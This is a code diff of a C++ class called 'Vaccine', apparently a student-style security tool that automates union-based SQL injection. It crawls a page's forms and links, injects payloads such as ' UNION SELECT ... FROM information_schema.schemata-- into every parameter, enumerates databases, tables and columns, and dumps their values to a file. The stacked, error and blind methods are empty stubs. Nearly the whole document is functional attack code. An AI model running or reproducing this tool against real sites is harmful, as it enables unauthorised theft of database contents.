@@ -1,42 +1,50 @@
 #include "../../include/class/Vaccine.hpp"
 
+// ===================================================================== //
+// ===================================================================== //
+// ============================ P U B L I C ============================ //
+// ===================================================================== //
+// ===================================================================== //
+
 Vaccine::Vaccine()
 {
+        this->_db_type = ALL;
         this->_url = std::string();
         this->_request_type = std::string();
-        this->_archive_file = std::string();
         this->_headers = std::vector< std::string >();
-        this->_db_type = 0;
+        this->_archive_file = std::string();
 
         this->_html = std::string();
         this->_html_doc = NULL;
-        this->_forms = std::vector< xmlNode* >();
+        this->_gates = std::vector< xmlNode* >();
 
-        this->_databases = std::map< std::string, std::vector< int > >();
-        this->_tables = std::vector< std::map< std::string, int > >();
-        this->_columns = std::vector< std::vector< std::string > >();
+        this->_databases = std::unordered_map< std::string, std::vector< int > >();
+        this->_tables = std::vector< std::unordered_map< std::string, int > >();
+        this->_columns = std::vector< std::unordered_map< std::string, int > >();
+        this->_values = std::vector< std::vector< std::string > >();
 }
 
 Vaccine::Vaccine(
+    const short& _db_type,
     const std::string& url,
-    const std::string& archive_file,
     const std::string& request_type,
     const std::vector< std::string >& headers,
-    const short& _db_type)
+    const std::string& archive_file)
 {
+        this->_db_type = _db_type;
         this->_url = url;
-        this->_archive_file = archive_file;
         this->_request_type = request_type;
         this->_headers = headers;
-        this->_db_type = _db_type;
+        this->_archive_file = archive_file;
 
         this->_html = std::string();
         this->_html_doc = NULL;
-        this->_forms = std::vector< xmlNode* >();
+        this->_gates = std::vector< xmlNode* >();
 
-        this->_databases = std::map< std::string, std::vector< int > >();
-        this->_tables = std::vector< std::map< std::string, int > >();
-        this->_columns = std::vector< std::vector< std::string > >();
+        this->_databases = std::unordered_map< std::string, std::vector< int > >();
+        this->_tables = std::vector< std::unordered_map< std::string, int > >();
+        this->_columns = std::vector< std::unordered_map< std::string, int > >();
+        this->_values = std::vector< std::vector< std::string > >();
 }
 
 Vaccine::Vaccine(const Vaccine& other)
@@ -57,11 +65,11 @@ Vaccine& Vaccine::operator=(const Vaccine& other)
 {
         if (this != &other)
         {
+                this->_db_type = other._db_type;
                 this->_url = other._url;
                 this->_request_type = other._request_type;
-                this->_archive_file = other._archive_file;
                 this->_headers = other._headers;
-                this->_db_type = other._db_type;
+                this->_archive_file = other._archive_file;
 
                 this->_html = other._html;
                 if (this->_html_doc)
@@ -72,13 +80,20 @@ Vaccine& Vaccine::operator=(const Vaccine& other)
                 }
                 if (other._html_doc)
                         this->_html_doc = new htmlDocPtr(*other._html_doc);
-                this->_forms = other._forms;
+                this->_gates = other._gates;
 
                 this->_databases = other._databases;
                 this->_tables = other._tables;
                 this->_columns = other._columns;
+                this->_values = other._values;
         }
         return *this;
+}
+
+// ==================================================== GETTERS
+const short& Vaccine::get_db_type() const
+{
+        return this->_db_type;
 }
 
 const std::string& Vaccine::get_url() const
@@ -91,19 +106,14 @@ const std::string& Vaccine::get_request_type() const
         return this->_request_type;
 }
 
-const std::string& Vaccine::get_archive_file() const
-{
-        return this->_archive_file;
-}
-
 const std::vector< std::string >& Vaccine::get_headers() const
 {
         return this->_headers;
 }
 
-const short& Vaccine::get_db_type() const
+const std::string& Vaccine::get_archive_file() const
 {
-        return this->_db_type;
+        return this->_archive_file;
 }
 
 const std::string& Vaccine::get_html() const
@@ -111,24 +121,40 @@ const std::string& Vaccine::get_html() const
         return this->_html;
 }
 
-const std::vector< xmlNode* >& Vaccine::get_forms() const
+const htmlDocPtr* Vaccine::get_html_doc() const
 {
-        return this->_forms;
+        return this->_html_doc;
 }
 
-const std::map< std::string, std::vector< int > >& Vaccine::get_databases() const
+const std::vector< xmlNode* >& Vaccine::get_gates() const
+{
+        return this->_gates;
+}
+
+const std::unordered_map< std::string, std::vector< int > >& Vaccine::get_databases() const
 {
         return this->_databases;
 }
 
-const std::vector< std::map< std::string, int > >& Vaccine::get_tables() const
+const std::vector< std::unordered_map< std::string, int > >& Vaccine::get_tables() const
 {
         return this->_tables;
 }
 
-const std::vector< std::vector< std::string > >& Vaccine::get_columns() const
+const std::vector< std::unordered_map< std::string, int > >& Vaccine::get_columns() const
 {
         return this->_columns;
+}
+
+const std::vector< std::vector< std::string > >& Vaccine::get_values() const
+{
+        return this->_values;
+}
+
+// ==================================================== SETTERS
+void Vaccine::set_db_type(const short& db_type)
+{
+        this->_db_type = db_type;
 }
 
 void Vaccine::set_url(const std::string& url)
@@ -141,21 +167,17 @@ void Vaccine::set_request_type(const std::string& request_type)
         this->_request_type = request_type;
 }
 
-void Vaccine::set_archive_file(const std::string& archive_file)
-{
-        this->_archive_file = archive_file;
-}
-
 void Vaccine::set_headers(const std::vector< std::string >& headers)
 {
         this->_headers = headers;
 }
 
-void Vaccine::set_db_type(const short& db_type)
+void Vaccine::set_archive_file(const std::string& archive_file)
 {
-        this->_db_type = db_type;
+        this->_archive_file = archive_file;
 }
 
+// ==================================================== METHODS
 bool Vaccine::fetch_data()
 {
         if (!this->_fetch_html())
@@ -191,6 +213,109 @@ bool Vaccine::fetch_data()
         return true;
 }
 
+void Vaccine::stacked_queries()
+{
+}
+
+void Vaccine::union_based()
+{
+        if (!this->_data_check())
+                return;
+        std::string url;
+        std::string offset;
+        std::vector< std::string > payloads;
+        std::vector< std::string > parameters;
+        const std::vector< std::string > excluded = {
+            "information_schema",
+            "performance_schema",
+            "mysql",
+            "sys",
+        };
+        for (const auto& node : this->_gates)
+        {
+                if (!this->_init_attempt(node, url, parameters))
+                        continue;
+                std::cout << "[ INFO ] Testing " << url << "..." << std::endl;
+                this->_fetch_databases(
+                    parameters,
+                    payloads,
+                    offset,
+                    url,
+                    excluded);
+                for (const auto& db : this->_databases)
+                        this->_fetch_tables(
+                            parameters,
+                            payloads,
+                            offset,
+                            url,
+                            db.first);
+                for (const auto& db : this->_databases)
+                        for (const auto& tab_index : db.second)
+                                this->_fetch_columns(
+                                    parameters,
+                                    payloads,
+                                    offset,
+                                    url,
+                                    db.first,
+                                    tab_index);
+                for (const auto& db : this->_databases)
+                        for (const auto& tab_index : db.second)
+                                this->_fetch_values(
+                                    parameters,
+                                    payloads,
+                                    offset,
+                                    url,
+                                    db.first,
+                                    tab_index);
+                if (!this->_databases.empty())
+                        this->_save_results(
+                            url.substr(0, url.find('?')),
+                            parameters,
+                            payloads);
+                else
+                        std::cout << "[ INFO ] Union based SQLi failed on "
+                                  << url << "." << std::endl;
+                offset.clear();
+                payloads.clear();
+                parameters.clear();
+                this->_databases.clear();
+                this->_tables.clear();
+                this->_columns.clear();
+                this->_values.clear();
+        }
+}
+
+void Vaccine::error_based()
+{
+}
+
+void Vaccine::blind_based()
+{
+}
+
+// ===================================================================== //
+// ===================================================================== //
+// =========================== P R I V A T E =========================== //
+// ===================================================================== //
+// ===================================================================== //
+
+// ==================================================== INIT
+bool Vaccine::_data_check() const
+{
+        if (this->_html.empty())
+        {
+                std::cerr << "[ ERROR ] Please fetch_data() first." << std::endl;
+                return false;
+        }
+        if (this->_gates.empty())
+        {
+                std::cerr << "[ ERROR ] " << this->_url
+                          << " has no managed SQLi entrypoint." << std::endl;
+                return false;
+        }
+        return true;
+}
+
 bool Vaccine::_fetch_html()
 {
         CURL* curl = curl_easy_init();
@@ -220,156 +345,244 @@ void Vaccine::_parse_html(xmlNode* node)
         for (node = node; node; node = node->next)
         {
                 if (node->type == XML_ELEMENT_NODE)
-                        if (!xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("form")))
-                                this->_forms.push_back(node);
+                {
+                        if (!xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("form")) ||
+                            !xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("a")))
+                                this->_gates.push_back(node);
+                }
                 if (node->children)
                         this->_parse_html(node->children);
         }
 }
 
-void Vaccine::union_based()
+bool Vaccine::_init_attempt(
+    const xmlNode* node,
+    std::string& url,
+    std::vector< std::string >& parameters) const
 {
-        if (!this->_data_check())
-                return;
-        std::string uri;
-        std::string full_url;
-        std::string payload;
-        std::string offset;
-        std::vector< std::string > base_entries;
-        std::vector< std::string > entries;
-        std::vector< std::string > payloads;
-        const std::vector< std::string > excluded = {
-            "information_schema",
-            "performance_schema",
-            "sys",
-            "mysql",
-        };
-        for (const auto& form : this->_forms)
-        {
-                this->_get_form_uri(form, uri);
-                if (uri.empty())
-                        continue;
-                full_url = this->_url + uri;
-                this->_get_form_entries(form, base_entries);
-                // -------------------------------- DATABASES
-                while (this->_databases.empty())
-                {
-                        payload = "' UNION SELECT " + offset + "schema_name " +
-                                  "FROM information_schema.schemata-- ";
-                        entries = this->_fill_entries(base_entries, payload);
-                        if (!this->_fill_databases(this->_process(full_url, entries), excluded))
-                                break;
-                        if (this->_databases.empty())
-                                offset += "null, ";
-                }
-                // -------------------------------- TABLES
-                if (!this->_databases.empty())
-                {
-                        payloads.push_back(payload);
-                        for (const auto& db : this->_databases)
-                        {
-                                payload = "' UNION SELECT " + offset + "table_name " +
-                                          "FROM information_schema.tables " +
-                                          "WHERE table_schema='" + db.first + "'-- ";
-                                entries = this->_fill_entries(base_entries, payload);
-                                this->_fill_tables(this->_process(full_url, entries), db.first);
-                        }
-                }
-                // -------------------------------- COLUMNS
-                if (!this->_tables.empty())
-                {
-                        payloads.push_back(payload);
-                        for (const auto& db : this->_databases)
-                        {
-                                for (const auto& index : db.second)
-                                {
-                                        for (const auto& table : this->_tables[index])
-                                        {
-                                                payload = "' UNION SELECT " + offset + "column_name " +
-                                                          "FROM information_schema.columns " +
-                                                          "WHERE table_schema='" + db.first + "' " +
-                                                          "AND table_name='" + table.first + "'-- ";
-                                                entries = this->_fill_entries(base_entries, payload);
-                                                this->_fill_columns(this->_process(full_url, entries), index, table.first);
-                                        }
-                                }
-                        }
-                }
-                if (!this->_columns.empty())
-                        payloads.push_back(payload);
-                // -------------------------------- |
-                this->_save_results(full_url, form, payloads);
-                offset.clear();
-                payloads.clear();
-                this->_databases.clear();
-                this->_tables.clear();
-                this->_columns.clear();
-        }
-}
+        if (!node || node->type != XML_ELEMENT_NODE)
+                return false;
 
-bool Vaccine::_data_check() const
-{
-        if (this->_html.empty())
+        xmlChar* gate = NULL;
+        if (!xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("form")))
         {
-                std::cerr << "[ ERROR ] Please fetch_data() first." << std::endl;
-                return false;
+                gate = xmlGetProp(node, reinterpret_cast< const xmlChar* >("action"));
+                this->_parse_form(node, parameters);
         }
-        if (this->_forms.empty())
+        else if (!xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("a")))
         {
-                std::cerr << "[ ERROR ] " << this->_url << " has no managed SQLi entrypoint." << std::endl;
-                return false;
+                gate = xmlGetProp(node, reinterpret_cast< const xmlChar* >("href"));
+                this->_parse_link(node, parameters);
         }
+        if (!gate)
+                return false;
+        url = this->_url + std::string(reinterpret_cast< char* >(gate));
+        xmlFree(gate);
         return true;
 }
 
-void Vaccine::_get_form_uri(const xmlNode* node, std::string& uri) const
+void Vaccine::_parse_form(
+    const xmlNode* node,
+    std::vector< std::string >& parameters) const
 {
-        if (!node || node->type != XML_ELEMENT_NODE ||
-            xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("form")))
-                return;
-
-        xmlChar* action = xmlGetProp(node, reinterpret_cast< const xmlChar* >("action"));
-        if (action)
+        xmlChar* name = NULL;
+        for (xmlNode* child = node->children; child; child = child->next)
         {
-                uri = std::string(reinterpret_cast< char* >(action));
-                xmlFree(action);
+                if (child->children)
+                        this->_parse_form(child, parameters);
+
+                if (child->type != XML_ELEMENT_NODE ||
+                    xmlStrcasecmp(child->name, reinterpret_cast< const xmlChar* >("input")))
+                        continue;
+                name = xmlGetProp(child, reinterpret_cast< const xmlChar* >("name"));
+                if (!name)
+                        continue;
+                parameters.push_back(std::string(reinterpret_cast< char* >(name)));
+                xmlFree(name);
         }
 }
 
-void Vaccine::_get_form_entries(
+void Vaccine::_parse_link(
     const xmlNode* node,
-    std::vector< std::string >& entries) const
+    std::vector< std::string >& parameters) const
 {
-        if (!node)
+        xmlChar* href = xmlGetProp(node, reinterpret_cast< const xmlChar* >("href"));
+        if (!href)
                 return;
-        for (node = node->children; node; node = node->next)
+        const std::string query(reinterpret_cast< char* >(href));
+        const size_t pos = query.find('?');
+        if (pos != std::string::npos)
         {
-                if (node->children)
-                        this->_get_form_entries(node, entries);
-                if (!(node->type == XML_ELEMENT_NODE &&
-                      !xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("input"))))
-                        continue;
-
-                xmlChar* id = xmlGetProp(node, reinterpret_cast< const xmlChar* >("id"));
-                if (id)
+                std::istringstream iss(query.substr(pos + 1));
+                std::string parameter;
+                while (std::getline(iss, parameter, '&'))
                 {
-                        entries.push_back(std::string(reinterpret_cast< char* >(id)));
-                        xmlFree(id);
+                        size_t delimiter = parameter.find('=');
+                        if (delimiter != std::string::npos)
+                                parameters.push_back(parameter.substr(0, delimiter));
+                }
+        }
+        xmlFree(href);
+}
+
+// ==================================================== PREPARE
+void Vaccine::_fetch_databases(
+    const std::vector< std::string >& base_parameters,
+    std::vector< std::string >& payloads,
+    std::string& offset,
+    const std::string& url,
+    const std::vector< std::string >& excluded)
+{
+        short timeout = TIMEOUT;
+        std::string payload;
+        while (this->_databases.empty() && timeout--)
+        {
+                payload = "' UNION SELECT " + offset + "schema_name " +
+                          "FROM information_schema.schemata-- ";
+                payloads.push_back(payload);
+
+                const std::vector< std::string > parameters = this->_fill_parameters(
+                    base_parameters,
+                    payload);
+                const std::vector< std::string > values = this->_parse_response(
+                    this->_process(url, parameters));
+
+                if (values.size() == 1 && values[0].empty())
+                        break;
+
+                bool is_excluded;
+                for (const auto& value : values)
+                {
+                        is_excluded = false;
+                        for (const auto& exclude : excluded)
+                                if (value == exclude)
+                                        is_excluded = true;
+                        if (!is_excluded)
+                                this->_databases[value] = std::vector< int >();
+                }
+                if (this->_databases.empty())
+                        offset += "null, ";
+        }
+}
+
+void Vaccine::_fetch_tables(
+    const std::vector< std::string >& base_parameters,
+    std::vector< std::string >& payloads,
+    std::string& offset,
+    const std::string& url,
+    const std::string& db_name)
+{
+        const std::string payload =
+            "' UNION SELECT " + offset + "table_name " +
+            "FROM information_schema.tables " +
+            "WHERE table_schema='" + db_name + "'-- ";
+        payloads.push_back(payload);
+
+        const std::vector< std::string > parameters = this->_fill_parameters(
+            base_parameters,
+            payload);
+        const std::vector< std::string > values = this->_parse_response(
+            this->_process(url, parameters));
+
+        if (values.empty())
+                return;
+
+        const int size = this->_tables.size();
+        this->_tables.push_back(std::unordered_map< std::string, int >());
+        for (const auto& value : values)
+                this->_tables[size][value] = -1;
+        this->_databases[db_name].push_back(size);
+}
+
+void Vaccine::_fetch_columns(
+    const std::vector< std::string >& base_parameters,
+    std::vector< std::string >& payloads,
+    std::string& offset,
+    const std::string& url,
+    const std::string& db_name,
+    const int& tab_index)
+{
+        if (tab_index < 0)
+                return;
+        std::string payload;
+        for (const auto& table : this->_tables[tab_index])
+        {
+                payload = "' UNION SELECT " + offset + "column_name " +
+                          "FROM information_schema.columns " +
+                          "WHERE table_schema='" + db_name + "' " +
+                          "AND table_name='" + table.first + "'-- ";
+                payloads.push_back(payload);
+                const std::vector< std::string > parameters = this->_fill_parameters(
+                    base_parameters,
+                    payload);
+                const std::vector< std::string > values = this->_parse_response(
+                    this->_process(url, parameters));
+
+                if (values.empty())
+                        return;
+
+                const int size = this->_columns.size();
+                this->_columns.push_back(std::unordered_map< std::string, int >());
+                for (const auto& value : values)
+                        this->_columns[size][value] = -1;
+                this->_tables[tab_index][table.first] = size;
+        }
+}
+
+void Vaccine::_fetch_values(
+    const std::vector< std::string >& base_parameters,
+    std::vector< std::string >& payloads,
+    std::string& offset,
+    const std::string& url,
+    const std::string& db_name,
+    const int& tab_index)
+{
+        if (tab_index < 0)
+                return;
+        int index;
+        std::string payload;
+        for (const auto& table : this->_tables[tab_index])
+        {
+                index = this->_tables.at(tab_index).at(table.first);
+                if (index < 0)
+                        continue;
+                for (auto& column : this->_columns[index])
+                {
+                        payload = "' UNION SELECT " + offset + column.first + ' ' +
+                                  "FROM " + db_name + '.' + table.first + "-- ";
+                        payloads.push_back(payload);
+                        const std::vector< std::string > parameters = this->_fill_parameters(
+                            base_parameters,
+                            payload);
+                        const std::vector< std::string > values = this->_parse_response(
+                            this->_process(url, parameters));
+
+                        if (values.empty())
+                                return;
+                        const int size = this->_values.size();
+                        this->_values.push_back(std::vector< std::string >());
+
+                        for (const auto& value : values)
+                                this->_values[size].push_back(value);
+                        this->_columns[index][column.first] = size;
                 }
         }
 }
 
-std::vector< std::string > Vaccine::_fill_entries(
-    const std::vector< std::string >& base_entries,
+std::vector< std::string > Vaccine::_fill_parameters(
+    const std::vector< std::string >& old_parameters,
     const std::string& payload) const
 {
-        std::vector< std::string > entries(base_entries);
-        for (auto& entry : entries)
-                entry = "\"" + entry + "\": \"" + payload + "\"";
-        return entries;
+        std::vector< std::string > new_parameters(old_parameters);
+        for (auto& parameter : new_parameters)
+                parameter = "\"" + parameter + "\": \"" + payload + "\"";
+        return new_parameters;
 }
 
-std::string Vaccine::_process(const std::string& full_url, const std::vector< std::string >& entries) const
+// ==================================================== PROCESS
+std::string Vaccine::_process(
+    const std::string& url,
+    const std::vector< std::string >& parameters) const
 {
         std::string buffer;
         CURL* curl = curl_easy_init();
@@ -378,19 +591,24 @@ std::string Vaccine::_process(const std::string& full_url, const std::vector< st
                 std::cerr << "[ ERROR ] curl_easy_init() failed." << std::endl;
                 return buffer;
         }
-        struct curl_slist* header_list = curl_slist_append(NULL, "Content-Type: application/json");
+        struct curl_slist* header_list = curl_slist_append(
+            NULL,
+            "Content-Type: application/json");
 
-        curl_easy_setopt(curl, CURLOPT_URL, std::string(full_url).c_str());
+        curl_easy_setopt(curl, CURLOPT_URL, std::string(url).c_str());
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, Vaccine::_curl_callback);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buffer);
         for (const auto& header : this->_headers)
+        {
+                std::cout << header << std::endl;
                 header_list = curl_slist_append(header_list, header.c_str());
+        }
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, header_list);
 
         if (this->_request_type == "GET")
-                this->_process_get(full_url, entries, &curl);
-        if (this->_request_type == "POST")
-                this->_process_post(entries, &curl);
+                this->_process_get(url, parameters, &curl);
+        else if (this->_request_type == "POST")
+                this->_process_post(parameters, &curl);
 
         curl_easy_cleanup(curl);
         curl_slist_free_all(header_list);
@@ -398,17 +616,16 @@ std::string Vaccine::_process(const std::string& full_url, const std::vector< st
 }
 
 void Vaccine::_process_get(
-    const std::string& full_url,
-    const std::vector< std::string >& entries,
+    const std::string& url,
+    const std::vector< std::string >& parameters,
     CURL** curl) const
 {
-        CURLcode res;
         std::string key;
         std::string value;
         std::stringstream ss;
         std::string query = "?";
         char* encoded_value = NULL;
-        for (const auto& entry : entries)
+        for (const auto& entry : parameters)
         {
                 ss = std::stringstream(entry);
                 std::getline(ss, key, ':');
@@ -426,19 +643,20 @@ void Vaccine::_process_get(
                 }
         }
         query.pop_back();
-
-        std::string payload = full_url + query;
+        std::string payload = url + query;
         curl_easy_setopt(*curl, CURLOPT_URL, payload.c_str());
-        res = curl_easy_perform(*curl);
+        CURLcode res = curl_easy_perform(*curl);
         if (res != CURLE_OK)
-                std::cerr << "[ ERROR ] curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
+                std::cerr << "[ ERROR ] curl_easy_perform() failed: "
+                          << curl_easy_strerror(res) << std::endl;
 }
 
-void Vaccine::_process_post(const std::vector< std::string >& entries, CURL** curl) const
+void Vaccine::_process_post(
+    const std::vector< std::string >& parameters,
+    CURL** curl) const
 {
-        CURLcode res;
         std::string payload = "{ ";
-        for (const auto& entry : entries)
+        for (const auto& entry : parameters)
                 payload += entry + ", ";
         if (payload.size() >= 2)
         {
@@ -448,180 +666,158 @@ void Vaccine::_process_post(const std::vector< std::string >& entries, CURL** cu
         payload += " }";
         curl_easy_setopt(*curl, CURLOPT_POSTFIELDSIZE, payload.size());
         curl_easy_setopt(*curl, CURLOPT_POSTFIELDS, payload.c_str());
-        res = curl_easy_perform(*curl);
+        CURLcode res = curl_easy_perform(*curl);
         if (res != CURLE_OK)
-                std::cerr << "[ ERROR ] curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
+                std::cerr << "[ ERROR ] curl_easy_perform() failed: "
+                          << curl_easy_strerror(res) << std::endl;
 }
 
-bool Vaccine::_fill_databases(const std::string& response, const std::vector< std::string >& excluded)
+std::vector< std::string > Vaccine::_parse_response(
+    const std::string& response) const
 {
-        Json::Value root;
+        std::vector< std::string > values;
+        Json::Value entries;
         std::string errors;
         Json::CharReaderBuilder builder;
         std::unique_ptr< Json::CharReader > reader(builder.newCharReader());
-        if (!reader->parse(response.c_str(), response.c_str() + response.size(), &root, &errors))
+        if (!reader->parse(
+                response.c_str(),
+                response.c_str() + response.size(),
+                &entries,
+                &errors))
         {
                 std::cerr << "[ ERROR ] Could not parse server response." << std::endl;
-                return false;
+                return values;
         }
-        for (const auto& member : root.getMemberNames())
+        for (const auto& member : entries.getMemberNames())
         {
-                if (root[member].isArray())
-                {
-                        if (root[member].empty())
-                                return false;
+                if (!entries[member].isArray())
+                        continue;
+                if (entries[member].empty())
+                        values.push_back(std::string());
 
-                        for (const auto& entry : root[member])
+                for (const auto& entry : entries[member])
+                {
+                        for (const auto& key : entry.getMemberNames())
                         {
-                                for (const auto& key : entry.getMemberNames())
+                                if (entry[key].isNull())
+                                        continue;
+                                std::string entry_str;
+                                try
                                 {
-                                        if (!entry[key].isNull())
-                                        {
-                                                bool is_excluded = false;
-                                                for (const auto& exclude : excluded)
-                                                        if (entry[key].asString() == exclude)
-                                                                is_excluded = true;
-                                                if (!is_excluded)
-                                                        this->_databases[entry[key].asString()] = std::vector< int >();
-                                                break;
-                                        }
+                                        entry_str = entry[key].asString();
                                 }
+                                catch (const std::exception& e)
+                                {
+                                        entry_str = "NOT_CONVERTIBLE";
+                                }
+                                values.push_back(entry_str);
+                                break;
                         }
-                        return true;
                 }
+                break;
         }
-        return true;
+        return values;
 }
 
-void Vaccine::_fill_tables(const std::string& response, const std::string& db)
-{
-        Json::Value root;
-        std::string errors;
-        Json::CharReaderBuilder builder;
-        std::unique_ptr< Json::CharReader > reader(builder.newCharReader());
-        if (!reader->parse(response.c_str(), response.c_str() + response.size(), &root, &errors))
-        {
-                std::cerr << "[ ERROR ] Could not parse server response." << std::endl;
-                return;
-        }
-        for (const auto& member : root.getMemberNames())
-        {
-                if (root[member].isArray())
-                {
-                        if (root[member].empty())
-                                return;
-
-                        const int index = this->_tables.size();
-                        this->_tables.push_back(std::map< std::string, int >());
-                        for (const auto& entry : root[member])
-                        {
-                                for (const auto& key : entry.getMemberNames())
-                                {
-                                        if (!entry[key].isNull())
-                                        {
-                                                this->_tables[index][entry[key].asString()] = -1;
-                                                break;
-                                        }
-                                }
-                        }
-                        this->_databases[db].push_back(index);
-                        break;
-                }
-        }
-}
-
-void Vaccine::_fill_columns(const std::string& response, const int& table_index, const std::string& table)
-{
-        Json::Value root;
-        std::string errors;
-        Json::CharReaderBuilder builder;
-        std::unique_ptr< Json::CharReader > reader(builder.newCharReader());
-        if (!reader->parse(response.c_str(), response.c_str() + response.size(), &root, &errors))
-        {
-                std::cerr << "[ ERROR ] Could not parse server response." << std::endl;
-                return;
-        }
-        for (const auto& member : root.getMemberNames())
-        {
-                if (root[member].isArray())
-                {
-                        if (root[member].empty())
-                                return;
-
-                        const int index = this->_columns.size();
-                        this->_columns.push_back(std::vector< std::string >());
-                        for (const auto& entry : root[member])
-                        {
-                                for (const auto& key : entry.getMemberNames())
-                                {
-                                        if (!entry[key].isNull())
-                                        {
-                                                this->_columns[index].push_back(entry[key].asString());
-                                                break;
-                                        }
-                                }
-                        }
-                        this->_tables[table_index][table] = index;
-                        break;
-                }
-        }
-}
-
+// ==================================================== SAVE
 void Vaccine::_save_results(
-    const std::string& full_url,
-    const xmlNode* gate,
-    std::vector< std::string > payloads) const
+    const std::string& url,
+    const std::vector< std::string >& parameters,
+    const std::vector< std::string > payloads) const
 {
-        std::ofstream file(this->_archive_file, std::ios_base::app);
+        std::ofstream file(this->_archive_file);
         if (!file.is_open())
         {
                 std::cerr << "[ ERROR ] Could not open " << this->_archive_file << '.' << std::endl;
                 return;
         }
         file << "========================= V A C C I N E =========================" << std::endl
-             << "URL: " << full_url << std::endl
-             << "REQUEST TYPE: " << this->_request_type << std::endl
-             << "CUSTOM HEADERS: " << (this->_headers.empty() ? "none" : "") << std::endl;
-        for (const auto& header : this->_headers)
-                file << "\t" << header << std::endl;
+             << "URL: " << url << std::endl
+             << "REQUEST TYPE: " << this->_request_type << std::endl;
 
-        file << "GATE: <" << gate->name << ' ';
-        for (xmlAttr* prop = gate->properties; prop; prop = prop->next)
+        if (!this->_headers.empty())
         {
-                xmlChar* value = xmlNodeListGetString(gate->doc, prop->children, 1);
-                if (!value || prop->name == reinterpret_cast< const xmlChar* >("method"))
-                        continue;
-                file << prop->name << "=\"" << value << "\"";
-                xmlFree(value);
-                if (prop->next)
-                        file << ' ';
+                file << "CUSTOM HEADERS: " << std::endl;
+                for (const auto& header : this->_headers)
+                        file << "\t" << header << std::endl;
         }
-        file << ">" << std::endl;
+
+        file << "PARAMETERS: " << std::endl;
+        for (const auto& parameter : parameters)
+                file << "\t" << parameter << std::endl;
 
         file << "PAYLOADS:" << std::endl;
         for (const auto& payload : payloads)
-                file << "\t" << payload << std::endl;
+                file << "\t\"" << payload << "\"" << std::endl;
 
         file << "-----------------------------------------------------------------" << std::endl;
         for (const auto& db : this->_databases)
         {
                 file << "DATABASE: " << db.first << std::endl;
-                for (const auto& index : db.second)
+                for (const auto& tab_index : db.second)
                 {
-                        for (const auto& table : this->_tables[index])
-                        {
-                                file << "\tTABLE: " << table.first << std::endl;
-                                for (const auto& column : this->_columns[index])
-                                        file << "\t\tCOLUMN: " << column << std::endl;
-                        }
+                        if (tab_index < 0)
+                                continue;
+                        for (const auto& table : this->_tables[tab_index])
+                                this->_save_table(file, tab_index, table.first);
                 }
         }
         file << "=================================================================" << std::endl
              << std::endl
              << std::endl;
+        file.close();
 }
 
-size_t Vaccine::_curl_callback(char* ptr, size_t size, size_t nmemb, void* buffer)
+void Vaccine::_save_table(
+    std::ofstream& file,
+    const int& tab_index,
+    const std::string& tab_name) const
+{
+        file << "\tTABLE: " << tab_name << std::endl;
+        file << "\t\tCOLUMN: ";
+        const int col_index = this->_tables.at(tab_index).at(tab_name);
+        if (col_index < 0)
+                return;
+        std::vector< int > value_indexes;
+
+        size_t count = 0;
+        size_t size = this->_columns[col_index].size();
+        for (const auto& column : this->_columns[col_index])
+        {
+                file << column.first;
+                if (++count < size)
+                        file << ", ";
+                value_indexes.push_back(column.second);
+        }
+        file << std::endl;
+        if (value_indexes.empty() || value_indexes[0] < 0)
+                return;
+
+        size = value_indexes.size();
+        for (size_t i = 0; i < this->_values[value_indexes[0]].size(); ++i)
+        {
+                file << "\t\t{ ";
+                count = 0;
+                for (const auto& j : value_indexes)
+                {
+                        if (i >= this->_values[j].size())
+                                file << "NULL";
+                        else
+                                file << this->_values[j][i];
+                        if (++count < size)
+                                file << ", ";
+                }
+                file << " }" << std::endl;
+        }
+}
+
+// ==================================================== STATICS
+size_t Vaccine::_curl_callback(
+    char* ptr,
+    size_t size,
+    size_t nmemb,
+    void* buffer)
 {
         ((std::string*)buffer)->append((char*)ptr, size * nmemb);
         return size * nmemb;
